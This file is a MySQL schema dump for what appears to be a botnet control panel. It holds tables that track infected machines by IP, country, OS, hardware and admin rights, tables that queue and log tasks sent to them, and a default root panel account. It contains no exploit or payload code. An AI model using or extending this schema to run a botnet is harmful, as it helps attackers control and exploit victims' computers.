SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;


CREATE TABLE IF NOT EXISTS `botlist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `botid` varchar(37) NOT NULL,
  `newbot` tinyint(1) NOT NULL,
  `country` varchar(50) NOT NULL,
  `country_code` varchar(2) NOT NULL,
  `ip` varchar(20) NOT NULL,
  `os` varchar(50) NOT NULL,
  `cpu` tinyint(1) NOT NULL,
  `type` tinyint(1) NOT NULL,
  `cores` int(11) NOT NULL,
  `version` varchar(20) NOT NULL,
  `net` varchar(10) NOT NULL,
  `botskilled` int(11) NOT NULL,
  `files` int(11) NOT NULL,
  `regkey` int(11) NOT NULL,
  `admin` tinyint(1) NOT NULL,
  `ram` int(11) NOT NULL,
  `busy` tinyint(1) NOT NULL,
  `lastseen` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `config` (
  `value` varchar(20) NOT NULL,
  `data` int(11) NOT NULL,
  `key` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

INSERT INTO `config` (`value`, `data`, `key`) VALUES
('knock', 90, ''),
('dead', 604800, ''),
('loginpagekey', 0, 'changeme');

CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `task` varchar(100) NOT NULL,
  `parameter` varchar(255) NOT NULL,
  `country` text NOT NULL,
  `os` text NOT NULL,
  `cpu` text NOT NULL,
  `type` text NOT NULL,
  `version` text NOT NULL,
  `net` text NOT NULL,
  `admin` text NOT NULL,
  `busy` text NOT NULL,
  `botid` varchar(37) NOT NULL,
  `limit` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `tasks_done` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `botid` varchar(37) NOT NULL,
  `taskid` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `botid` (`botid`,`taskid`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  `lastip` varchar(16) NOT NULL,
  `lastseen` int(11) NOT NULL,
  `admin` tinyint(1) NOT NULL,
  `priv1` tinyint(1) NOT NULL,
  `priv2` tinyint(1) NOT NULL,
  `priv3` tinyint(1) NOT NULL,
  `priv4` tinyint(1) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

INSERT INTO `users` (`id`, `username`, `password`, `lastip`, `lastseen`, `admin`, `priv1`, `priv2`, `priv3`, `priv4`) VALUES
(1, 'root', 'a917943c0b824b01aa79178794adb6a9c58f3ed44b0302669cf6748a150477397ce4c9ac93663c93df6ab7f243defd2e64a79c4071f0e08af4de61a2b78059e0', 'N/A', 0, 1, 0, 0, 0, 0);

CREATE TABLE IF NOT EXISTS `webcheck` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `botid` varchar(37) NOT NULL,
  `website` varchar(255) NOT NULL,
  `status` varchar(50) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `botid` (`botid`,`website`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

CREATE TABLE IF NOT EXISTS `peaks` (
  `alltime` int(11) NOT NULL,
  `sevendays` int(11) NOT NULL,
  `twentyfourhours` int(11) NOT NULL
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

INSERT INTO `peaks` (`alltime`, `sevendays`, `twentyfourhours`) VALUES
(0, 0, 0);

CREATE TABLE IF NOT EXISTS `ip_country` (
  `ip_start` varchar(15) NOT NULL,
  `ip_end` varchar(15) NOT NULL,
  `ip_start_long` int(11) NOT NULL,
  `ip_end_long` int(11) NOT NULL,
  `country_code` varchar(2) NOT NULL,
  `country_name` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;